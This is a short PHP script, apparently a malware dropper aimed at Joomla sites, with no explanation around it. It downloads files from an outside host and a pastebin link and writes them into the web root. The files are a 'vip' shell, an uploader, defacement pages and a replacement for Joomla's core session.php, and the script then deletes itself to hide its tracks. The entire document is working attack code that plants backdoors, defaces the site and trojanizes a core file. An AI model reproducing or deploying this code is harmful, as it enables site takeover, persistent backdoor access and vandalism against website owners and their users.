<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/tmp/vip.php" ;
$text = http_get('http://talkbusinessmagazine.co.uk/wp-content/joomla/vip.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/tmp/upxx.php" ;
$text2 = http_get('http://talkbusinessmagazine.co.uk/wp-content/joomla/uploader.txt');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."</br>";
}else 
  echo "not exits2";
echo "done2 .\n " ;

$check3=$_SERVER['DOCUMENT_ROOT'] . "/x.txt" ;
$text3 = http_get('http://talkbusinessmagazine.co.uk/wp-content/joomla/deface.txt');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);

$check4=$_SERVER['DOCUMENT_ROOT'] . "/tmp/check.php" ;
$text4 = http_get('http://talkbusinessmagazine.co.uk/wp-content/joomla/check.txt');
$op4=fopen($check4, 'w');
fwrite($op4,$text4);
fclose($op4);

$check5=$_SERVER['DOCUMENT_ROOT'] . "/x.php" ;
$text5 = http_get('http://talkbusinessmagazine.co.uk/wp-content/joomla/deface.txt');
$op5=fopen($check5, 'w');
fwrite($op5,$text5);
fclose($op5);

$check6=$_SERVER['DOCUMENT_ROOT'] . "/libraries/joomla/session/session.php" ;
$text6 = http_get('http://pastebin.com/raw/UHAGT887');
$op6=fopen($check6, 'w');
fwrite($op6,$text6);
fclose($op6);


@unlink(__FILE__);


?>